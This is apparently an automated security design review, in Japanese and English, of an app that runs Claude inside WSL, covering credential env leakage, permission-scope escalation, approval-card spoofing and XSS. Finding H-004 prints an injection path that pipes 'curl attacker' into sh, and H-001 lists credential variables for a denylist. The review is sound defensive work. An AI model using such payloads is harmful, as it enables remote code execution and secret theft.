# Track D — security-reviewer

**Run**: 2026-09-25 · **Gate**: design · **Verdict**: Critical 0 / High 7 / Medium 5 / Low 0

## viewpoint coverage
- A 認可/認証/secret/プロセス境界: Critical 0 / High 3 / Medium 2
- B 入力検証/injection/XSS/CSP/暗号: Critical 0 / High 4 / Medium 1
- C/D/E/F/G: 該当なし (他 reviewer owner)
- H テスト/observability/regression: Medium 2

## Findings

### [High] H-001 — 起動 env 許可リストが未定義で WSLENV 経由の資格情報伝播が塞がれる保証がない (scope: feature)
- **Where**: data-model §7 (112-119。中身未列挙、CLAUDE_CONFIG_DIR を punt) / contracts C-5 (56-60) / FR-006 / SC-006
- **Issue**: 許可リストの実名集合が正本として無い。`wsl.exe` は `WSLENV` 列挙変数を WSL へ透過。許可リストが WSLENV / PATH 経由で資格情報系を引き込むと秘密がアプリを通り WSL 内 claude に渡る (AD-011 / Principle V 違反)
- **Action**: (1) env 許可リストの実名集合を data-model §7 / C-5 の正本に確定 (Windows→WSL 最小集合)。(2) `WSLENV` と資格情報系 (`ANTHROPIC_API_KEY`/`AWS_*`/`*_TOKEN`/`*_SECRET`/`*_KEY`) を denylist に置き許可リストに現れないことを SC-006 で assert。(3) SC-006(c) を「渡す env キーに credential パターン 0 件」へ拡張
- CWE-522 / CWE-200

### [High] H-002 — 強制終了の kill 対象 (utilityProcess か wsl.exe か) が未確定で孤児を残す設計になりうる (scope: feature)
- **Where**: FR-016 (257-259「wsl.exe プロセスの kill」) vs data-model §1 / contracts C-6 / BE-021/022 (「app が保持する spawn ハンドル」)。app が spawn するのは utilityProcess であり wsl.exe はその内側で SDK が起こす
- **Issue**: AD-018 の測定は「wsl.exe kill で孤児無し」を示しただけ。utilityProcess だけ kill したとき wsl.exe+claude+UNC ハンドルが孤児化しうる (未測定)。FR-017/SC-005 と AD-018 §3 Decision に反する。**resolve 方向を誤ると Critical 相当に昇格**
- **Action**: (1) 「spawn ハンドル」が wsl.exe か utilityProcess かを data-model §1/C-6 で一意確定。(2) agents は WSL-free のため wsl.exe の PID/ハンドルをどの層が保持し kill するか配線明記 (agents が SDK 経由で得た子ハンドルを Electron 非依存で app へ通知 → app kill 等)。(3) SC-005 を「utilityProcess kill 後に wsl.exe が残らない」まで含める
- AD-018 §3 / FR-017 / SC-005 / CWE-404 / CWE-772

### [High] H-003 — permission 決定の outcome/scope の enum 検証と scope 整合検証が契約に無い (scope: feature)
- **Where**: contracts C-1:13 (respondPermission 検証は「sessionId+requestId 一致/データ経路不可」のみ) / data-model §5 (outcome/scope は renderer 供給の未信頼値)
- **Issue**: (1) `as` キャストで型外値が allow に倒れる type-confusion → 意図しない tool 実行 (権限昇格)。(2) 要求が `once` なのに決定 `scope:'capability'` を送れると単発承認が capability 格上げ → 以後聞かれず実行 (default モードを実質 auto 相当に緩める)
- **Action**: C-1 に「`outcome∈{allow,deny}`/`scope∈{once,capability}` を明示述語で検証 (`as` 禁止)」「決定 scope が要求 scope を超えない (once 要求に capability 決定を受理しない)」を追記。SC-007 に scope 整合の負例。validate.ts の既存 enum/membership 述語に合わせる
- AD-023 セキュリティ要件 5 / Principle III / CWE-269 / CWE-20

### [High] H-004 — WSL 起動 argv の構築方式 (配列 vs 文字列連結) が未定義でパス経由のコマンドインジェクション面が残る (scope: feature)
- **Where**: data-model §8 (RuntimeLaunchSpec。argv 配列・非補間の規定なし) / FR-005 (stdin 保全のみ、メタ文字補間禁止に触れず) / BE-002
- **Issue**: cwd は登録 WSL フォルダパス。R-1 の isValidPathDTO は制御文字と `\` を弾くが**シェルメタ文字 (`;` `` ` `` `$( )` `&&` `|` 空白) は POSIX パスとして通過**。`bash -lc '<...>'` にパスを文字列補間すると `/home/u/$(curl attacker|sh)` で WSL 内 RCE
- **Action**: data-model §8/contracts に「argv は配列で構成、distro 名・cwd・claude パスを個別 argv 要素として渡す。シェルに組む場合も未信頼値を文字列補間しない」を明記。SC-006 にメタ文字入りパスが引数境界を越えない負例
- AD-018 §4 / CWE-78 / OWASP A03

### [High] H-005 — 承認カードの `toolName` にサニタイズが規定されず認可対象を偽装できる (scope: feature)
- **Where**: data-model §5 (input は SanitizedToolInput だが `toolName: string` はサニタイズ指定なし) / FR-012
- **Issue**: tool 名は MCP サーバ由来でも決まり攻撃者が制御しうる。bidi/ゼロ幅/ホモグリフ/改行で「Read に見せて実体 Bash」等の表示偽装 = **利用者が security 判断を下す UI での spoofing**
- **Action**: data-model §5 に「toolName も sanitizeBody 相当 (bidi・C0/C1 除去) + byte 上限 + plain text 表示」を明記。SC-008 の DTO 全文字列走査に toolName を含める
- FR-009 / AD-035 §6 / CWE-1007 / CWE-451

### [High] H-006 — streaming (逐次/partial) のサニタイズ適用点と累積バイト上限が未定義で XSS 境界と DoS 防御が回帰しうる (scope: feature)
- **Where**: data-model §3 (「R-3 と同じ正規化」のみ) / spec Assumption 352-353 (partial か逐次更新か未確定)。sanitize-body.ts は完結文字列 1 本 + BODY_MAX_BYTES 前提で逐次追記を想定しない
- **Issue**: (1) partial delta 単位サニタイズだと bidi/サロゲートがチャンク境界で分割され除去漏れ/文字化け。(2) byte 上限を delta ごとに適用すると累積が無制限 → renderer メモリ枯渇 (DoS)
- **Action**: data-model §3 に「サニタイズは取得プロセス側で完結メッセージ単位に適用 (partial なら追記後全体または境界安全な incremental sanitizer)」「byte 上限はメッセージ累積で効かせる」。SC-008 にチャンク境界 bidi/サロゲート・累積超過の負例
- FR-009 / SC-008 / AD-034 / CWE-400 / CWE-838

### [High] H-007 — 新規 markdown レンダラ (Streamdown 等) 採用時に R-3 の render 側 XSS 境界 (urlTransform / no-rehype-raw) をバイパスしうる (scope: feature)
- **Where**: spec Assumption 349-351。R-3 の URL allowlist は react-markdown の `urlTransform` prop (safe-url.ts:34-49)、生 HTML 非描画は rehype-raw を足さない構成に依存
- **Issue**: sanitizeBody はデータ境界のみで `[x](javascript:...)` は正当な本文として DTO 通過 (無害化は render 側 urlTransform が担う)。Streamdown 差し替え時に urlTransform 相当を配線し忘れると javascript:/file: 活性化、raw HTML 既定のレンダラなら生 HTML 描画。SC-008 の DTO 走査では構造的に検出不能
- **Action**: research R-01 の採否条件に「新レンダラは (1) URL allowlist を safe-url.ts 同等の deny-by-default で配線、(2) raw HTML 無効、を必須。満たせなければ不採用」。SC-008 に render 経路の component テスト (javascript:/vbscript:/file: リンク・生 HTML 片が描画で無害化)
- FR-009 / SC-008 / AD-034 / AD-035 §6 / CWE-79

### [Medium] M-001 — プロンプト本文・tool 入力・stream 本文のログ混入が制約されていない (scope: feature)
- FR-006/SC-006c は env のみ。会話由来ペイロード (prompt/argsText/stream 本文/permission 要求) のログ非混入が無い。会話には資格情報/PII が日常的に含まれる → env より広い漏洩面
- **Action**: 「会話由来ペイロードをログ/エラー/クラッシュレポートに出さない (理由キー・sessionId・requestId のメタのみ)」を追加。SC-006 のログ走査を会話ペイロード全般へ拡張。CWE-532

### [Medium] M-002 — 同時/連続 launch の単一セッションガードが契約に無く資源枯渇 (DoS) 面が残る (scope: feature)
- C-1 launch 検証に「既に active/launching なら拒否」が無い。連続発行で utilityProcess(~50MB)+wsl.exe/claude(~225MB,~2.7s) が積む
- **Action**: C-1 に「active/launching なら拒否 (単一セッション不変)」、main で idempotent/mutex 化、SC-002/010 に「連続 launch でプロセス 1 個超えない」。CWE-770

### [Medium] M-003 — live stream port2 の renderer 受け渡し (window.postMessage) の marker/token 照合が契約に明記されていない (scope: feature)
- MessagePort は contextBridge を越えられず R-3 は window.postMessage + marker + requestToken 照合 (capability.ts:120-134)。X-1 の port も同橋を渡るが C-2 が token 照合を明記せず → 偽 port 注入/横取りの余地
- **Action**: C-2 に「session port も専用 marker + セッション固有 token を付し renderer は token 照合した ports[0] のみ受理」。SC-007 に他 token/marker の port を受理しない負例。CWE-346

### [Medium] M-004 — permission 決定・拒否された制御要求・kill の監査点 (observability) が無い (scope: feature)
- 認可判断/未信頼制御拒否/kill の security イベントに log/metric が無い。incident 分析不可
- **Action**: permission 決定・拒否制御・kill を会話ペイロード除外で構造化ログに残す観測点を plan に追加 (M-001 と整合)。OWASP A09

### [Medium] M-005 — SC-008 の XSS 回帰テストがデータ境界中心で render 経路と新表示面を測れない (scope: feature)
- SC-008 は変換/サニタイズ単体 + DTO 走査のみ。H-005 (toolName)/H-007 (render urlTransform)/H-006 (streaming 境界) を構造的に検出しない
- **Action**: SC-008/SH-020 に render 経路の component テスト (承認カード toolName/argsText 偽装、live 描画の javascript:/生 HTML 無害化、chunk 境界 bidi) を追加

## 設計の強み (記録のみ)
- permissionMode を `'default'` リテラル型で固定 (data-model.md:32) — Principle III/FR-013 を型で担保
- 制御を検証済み IPC に一本化し port からの制御発行を封じる (C-1/C-2/FR-010) — AD-034 決定 1 を per-session に一般化
- 既存 BrowserWindow hardening (window.ts) + isTrustedSender (validate.ts) を継承する前提

## Verdict
Critical 0 / High 7 / Medium 5 / Low 0。H-002 は resolve 方向を誤ると AD-018 §3 drift + SC-005 違反で Critical 相当に昇格。いずれも data-model §7/§8・contracts C-1/C-2/C-5・BE-002〜011 の文面ピン留めで解消可能。
